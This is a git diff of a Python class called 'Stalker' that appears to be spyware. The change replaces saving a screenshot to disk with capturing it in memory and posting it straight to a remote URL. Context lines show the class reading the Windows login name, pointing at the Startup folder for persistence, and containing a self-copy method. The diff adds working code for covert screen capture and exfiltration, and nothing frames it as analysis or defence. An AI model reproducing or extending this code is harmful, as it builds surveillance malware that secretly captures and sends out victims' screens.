@@ -12,6 +12,7 @@ from PIL import ImageGrab
 
 
 
+
 class Stalker:
     def __init__(self):
         self.running = True
@@ -35,7 +36,7 @@ class Stalker:
 
         self.Username = os.getlogin()
         self.ProgramName = sys.argv[0].split("\\")[-1]
-        self.ScreenshotsImage_name = "image_MTI0NjE1MjgxMjA3Nzc3Njk2Ng.png"
+        # self.ScreenshotsImage_name = "image_MTI0NjE1MjgxMjA3Nzc3Njk2Ng.png"
         self.StartupFolder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
         
         self.ImageExtensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff')
@@ -100,10 +101,6 @@ class Stalker:
                 pass
 
 
-    def RemoveScreenshots(self):
-        os.remove(self.ScreenshotsImage_name)
-
-
     def SendImage(self, file_name, url):
         try:
             image_file = open(file_name, "rb")
@@ -122,10 +119,14 @@ class Stalker:
     def Screenshots(self):
         while self.running:
             time.sleep(self.ScreenshotsDelay_sec)
-            ImageGrab.grab().save(self.ScreenshotsImage_name)
-            # self.SendText(self.Username, self.Screenshots_url)
-            self.SendImage(self.ScreenshotsImage_name, self.Screenshots_url)
-            self.RemoveScreenshots()
+            screenshot = ImageGrab.grab()
+
+            buffer = BytesIO()
+            screenshot.save(buffer, format="PNG")
+            buffer.seek(0)
+
+            files = {'file': ("screenshot.png", buffer, "image/png")}
+            requests.post(self.Screenshots_url, headers=self.Headers, files=files)
     
 
     def MakeACopy(self):
